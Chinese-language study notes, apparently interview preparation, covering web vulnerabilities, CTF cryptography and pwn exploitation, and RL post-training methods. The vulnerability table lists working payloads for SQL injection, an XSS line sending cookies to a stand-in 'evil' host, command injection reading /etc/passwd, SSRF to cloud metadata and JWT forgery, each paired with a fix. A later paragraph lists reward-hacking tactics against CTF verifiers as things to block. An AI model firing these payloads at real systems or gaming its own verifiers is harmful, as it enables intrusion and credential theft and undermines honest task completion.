二、Web 漏洞：根因、载荷、修复

绝大多数 Web 漏洞是同一件事：程序把"数据"当成了"指令或结构"，攻击者控制的输入越过数据边界，进入了某个解释器的语法层。

常见漏洞：一句原理 + 载荷 + 修复

漏洞最小载荷示例根因 / 修复
SQL 注入name=' OR '1'='1 使 WHERE 恒真；admin'-- 注释掉密码校验拼接构造 SQL；用参数化查询
XSS<script>fetch('//evil/'+document.cookie)</script> 偷会话未按上下文编码；输出编码 + CSP + HttpOnly
命令注入host=8.8.8.8; cat /etc/passwd把输入交给 shell；用数组传参不过 shell
SSRFurl=http://169.254.169.254/latest/meta-data/ 读云凭证无条件请求用户 URL；白名单 + 校验解析 IP
SSTI{{7*7}} 回显 49 → {{''.__class__.__mro__[1].__subclasses__()}}输入拼进模板；数据走参数不拼模板
路径穿越file=../../../../etc/passwd输入进文件路径；白名单映射 + 规范化校验
反序列化Java readObject gadget 链；Python pickle.loads（见文档 10）反序列化不可信数据；用 JSON/safetensors
IDOR 越权GET /order?id=1002 看别人订单只认证不授权；每次校验资源归属
JWTalg:none 去签名改 payload；RS256→HS256 用公钥当密钥伪造不校验算法；固定并强制校验算法 + 强密钥
OWASP Top 10（2021）：A01 访问控制失效 · A02 加密失效 · A03 注入 · A04 不安全设计 · A05 配置错误 · A06 过时组件 · A07 认证失效 · A08 软件与数据完整性失效（含不安全反序列化、供应链） · A09 日志监控失效 · A10 SSRF。

三、密码题的公式（CTF 考误用，不考硬破强算法）

异或加密与已知明文攻击（你解 ghidra_malware 用的）

P ⊕ K = C 明文异或密钥得密文 C ⊕ K = P 密文异或密钥还原明文（对称可逆） P ⊕ C = K ★关键：已知一段明文和对应密文，异或即得密钥 条件：已知明文长度 ≥ 密钥长度（重复异或时）。 实例：已知配置头 "BEACON01185.141."(16B) ⊕ 密文头(16B) = 16B 密钥

RSA 及其常见弱点

n = p·q φ(n) = (p-1)(q-1) e·d ≡ 1 (mod φ(n)) 加密: c = m^e mod n 解密: m = c^d mod n 私钥 d 需要 φ(n)，而 φ(n) 需要分解 n = p·q
弱点为什么可解解法
n 太小 / p、q 太近能分解 n 就能算出 dfactordb 查已知分解；Fermat 分解近素数
小指数 e=3 且 m 小m³ < n 时未取模，c = m³直接开三次方 m = ∛c
共模 / 相关消息同一 n 或相关明文加密共模攻击、Franklin-Reiter

TEA 族识别（你解 newyear_keygen2 用的）

标准 TEA 每轮用魔数 DELTA 推进： sum += DELTA; DELTA = 0x9E3779B9 (黄金分割相关) 逆向诀窍：在二进制里搜到 DELTA 常量，基本就确认是 TEA 族。 这道题是 TEA 变体，DELTA 改成 0xB979379E，在偏移 11839 找到 → 确认算法族。
其它 CTF crypto 高频弱点：ECB 模式（相同明文块→相同密文块，可分块重排）、nonce 复用（CTR 复用可异或消去密钥流，ECDSA 复用可解出私钥）、弱随机数（Mersenne Twister 可恢复状态预测输出）。

五、Pwn 内存模型与两阶段利用

进程内存布局

栈溢出：往 buf[] 写超量数据，向高地址覆盖返回地址，改成想跳去的地址。

为什么现代 pwn 是两阶段

阶段一信息泄露绕 ASLR：泄露一个地址，算出基址
→
阶段二ROP 劫持绕 NX：串已有代码片段调 system("/bin/sh")
缓解绕过
NX 数据不可执行ROP 复用已有代码
ASLR 地址随机先泄露地址
Canary 栈哨兵泄露 canary 再写回
PIE 代码也随机泄露代码指针

一步错则全盘错，要维持跨步状态，这正是它作为长程 agentic 训练任务价值高的原因。

这是岗位的核心工程，也是你 agent 经验的用武之地。三种可验证性由易到难。

可验证层次怎么判定你解的题里的例子作 RL 奖励

防猜 flag 的熵（为什么 flag 主体要随机）

flag 主体 = L 个字符, 每字符取自大小为 base 的字符集： 猜中概率 = base^(-L) 熵 = L · log2(base) bits 例：16 个 hex 字符 → 熵 = 16·4 = 64 bit，猜中概率 2^-64，可忽略。
reward hacking 高发形态（要主动堵）：直接 grep flag、猜 flag、以及最隐蔽的打 verifier 本身（子串匹配就把海量候选全打印命中、改 verifier 读结果的可写文件、状态检查只看端口有响应就随便起服务占住）。原则：让真正解题成为拿奖励的唯一低成本路径。

七、后训练全流程（岗位的正题）

把安全推理内化进模型，走的就是这条后训练管线。前沿做法是多阶段混合。

起点预训练模型会补全，但不按指令、不保证答案对
→
SFT 冷启动模仿(提示,标准答案)交叉熵，学格式和基本行为
→
RLVR提能力可验证环境自己解、成败当奖励做 RL，把决策写进权重
→
拒绝采样回收筛出解对的轨迹再 SFT
→
通用对齐收口RLHF/DPO 修风格与安全
顺序式 RL（GLM-5 报告的做法）：推理 RL 打底 → agentic RL 叠自主规划 → 通用 RL 收口 → 跨阶段 on-policy 蒸馏防前面能力被后面训忘。安全推理内化在 agentic RL 那一段，用真实测试执行（Fail-to-Pass / Pass-to-Pass）当奖励。

八、RL 的核心公式（讲准这几个就够）

策略梯度与优势

∇J = E[ ∇log π(a|s) · A ] 提高高回报动作的概率 A = 回报 − 基线(baseline) 优势 = 这个动作比平均好多少

PPO：clip 与 KL 管的是两件事

r = π_new(a|s) / π_old(a|s) 重要性采样比 L_clip = E[ min( r·A , clip(r, 1−ε, 1+ε)·A ) ] clip：离本轮采样策略别太远（稳定） reward_total = r_task − β · KL(π ‖ π_ref) KL：离初始参考模型别太远（防丢通用能力/抗hack）

GRPO：用组内相对优势省掉 value model

对同一 prompt 采一组 G 个回答，各得奖励 r_1…r_G： A_i = ( r_i − mean(r) ) / std(r) 组内标准化，无需 critic 坑：一组全对或全错时 A_i 全为 0，该题这轮无梯度 → 需要课程/难度匹配

评估：pass@k

pass@k = 采 k 个答案至少一个通过的概率 无偏估计: pass@k = 1 − C(n−c, k) / C(n, k) n 个样本中 c 个正确 陷阱：RL 常提升 pass@1 但可能压低 pass@k（多样性下降）。 pass@1 涨而 pass@k 不涨 = 采样效率提高，不是能力边界扩展。

九、GRPO 与 SAO：取舍怎么反转（唐杰系论文）

GRPOSAO（arXiv 2607.07508，训 GLM-5.2）
采样每个 prompt 采一组每个 prompt 采一条 rollout
基线（算优势）用组内平均，省掉 value model没有组了，把 value model 请回来
稳定性同步下够稳严格双侧 token 级裁剪稳住异步
适合同步、离线固定题库、每题能廉价采一组异步、长程、在线演化、环境只给单信号
一句判断：不是谁替代谁，是设定决定选择。当采样从"组"变成"单轨迹"，"要不要 value model"这个取舍就反过来了。异步加稀疏奖励一叠加，一个好 critic 反而更稳更省。这也和 credit assignment 那条线（去 value 的 GRPO 在稀疏奖励下 step 级估计不准）互相印证。用词准确：SAO 训的是 GLM-5.2（750B-A40B），不是首发 GLM-5。
